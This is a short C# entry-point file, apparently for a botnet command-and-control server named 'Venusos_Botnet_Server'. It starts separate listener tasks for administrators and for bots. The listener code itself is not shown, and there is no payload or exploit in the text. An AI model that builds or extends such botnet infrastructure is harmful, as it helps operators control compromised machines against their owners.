using Venusos_Botnet_Server;

Task adminListenerTask = Task.Run(() =>
{
    AdminsServer.StartListener();
});
Task botsListenerTask = Task.Run(() =>
{
    BotsServer.StartListener();
});
Task.WaitAll(adminListenerTask, botsListenerTask);